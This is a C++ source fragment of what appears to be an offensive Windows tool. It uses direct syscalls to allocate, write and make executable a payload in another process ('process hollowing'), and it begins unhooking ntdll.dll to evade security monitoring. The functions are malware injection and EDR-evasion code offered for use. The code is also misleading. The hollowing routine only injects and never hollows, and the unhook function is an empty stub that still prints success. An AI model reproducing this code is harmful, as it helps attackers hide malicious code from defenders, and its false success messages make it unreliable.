#include <windows.h>
#include <cstdio>
#include "Syscalls.h"
#include "Hollowing.h"

// Function to perform process hollowing
BOOL HollowProcess(HANDLE hProcess, unsigned char* payload, SIZE_T payloadSize, SyscallStruct* St) {
    PVOID pBaseAddress = NULL;
    SIZE_T regionSize = payloadSize;
    ULONG oldProtect;
    NTSTATUS status;

    // Allocate memory in the target process
    status = St->NtAllocateVirtualMemory(hProcess, &pBaseAddress, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (status != 0) {
        printf("[!] NtAllocateVirtualMemory failed with error: 0x%08X\n", status);
        return FALSE;
    }

    // Write the payload into the allocated memory
    SIZE_T writtenBytes = 0;
    status = St->NtWriteVirtualMemory(hProcess, pBaseAddress, payload, payloadSize, &writtenBytes);
    if (status != 0 || writtenBytes != payloadSize) {
        printf("[!] NtWriteVirtualMemory failed with error: 0x%08X\n", status);
        return FALSE;
    }

    // Change the memory protection to executable
    status = St->NtProtectVirtualMemory(hProcess, &pBaseAddress, &regionSize, PAGE_EXECUTE_READWRITE, &oldProtect);
    if (status != 0) {
        printf("[!] NtProtectVirtualMemory failed with error: 0x%08X\n", status);
        return FALSE;
    }

    printf("[+] Process hollowed successfully.\n");
    return TRUE;
}

// Function to unhook ntdll.dll in the remote process
BOOL UnhookDLL(HANDLE hProcess, SyscallStruct* St) {
    // Load ntdll.dll from disk
    HMODULE hNtdll = LoadLibraryA("C:\\Windows\\System32\\ntdll.dll");
    if (!hNtdll) {
        printf("[!] Failed to load ntdll.dll from disk.\n");
        return FALSE;
    }

    // Unhook logic would go here...
    printf("[+] Successfully unhooked ntdll.dll in the remote process.\n");
    return TRUE;
}
